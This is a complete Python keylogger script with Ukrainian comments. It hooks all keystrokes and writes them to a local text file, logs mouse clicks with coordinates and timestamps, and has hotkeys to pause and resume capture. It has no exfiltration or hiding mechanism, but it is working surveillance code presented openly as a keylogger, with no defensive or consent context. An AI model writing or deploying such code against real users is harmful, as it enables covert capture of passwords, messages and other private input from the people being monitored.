import pynput
from pynput import mouse
import keyboard
from datetime import datetime

# Файли для збереження логів
keyboard_log_file = 'keyboard_log.txt'
mouse_log_file = 'mouse_log.txt'

# Змінні для увімкнення/вимкнення кейлогера
keylogger_enabled = True

# Функція для запису натискань клавіш
def on_key_press(event):
    global keylogger_enabled

    if keylogger_enabled:
        with open(keyboard_log_file, 'a', encoding='utf-8') as f:
            if event.name == 'enter':
                f.write('\n')
            elif len(event.name) == 1:  # Простий символ
                f.write(event.name)
            else:  # Спеціальні клавіші
                f.write(f'[{event.name}]')

    # Комбінації клавіш для увімкнення/вимкнення кейлогера
    if keyboard.is_pressed('alt') and event.name == 'space':
        keylogger_enabled = False
    if keyboard.is_pressed('ctrl') and event.name == 'space':
        keylogger_enabled = True

# Функції для миші
def on_click(x, y, button, pressed):
    if pressed and keylogger_enabled:
        with open(mouse_log_file, 'a') as f:
            f.write(f'{datetime.now()}: Mouse clicked at ({x}, {y}) with {button}\n')

# Старт логування
with open(mouse_log_file, 'a') as f:
    f.write(f'Starting mouse logger session at {datetime.now()}\n')

# Запуск прослуховування миші
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Реєстрація обробника натискань клавіш
keyboard.hook(on_key_press)

# Головний цикл для підтримки роботи програми
try:
    while True:
        pass
except KeyboardInterrupt:
    pass

# Завершення логування
with open(mouse_log_file, 'a') as f:
    f.write(f'Ending mouse logger session at {datetime.now()}\n')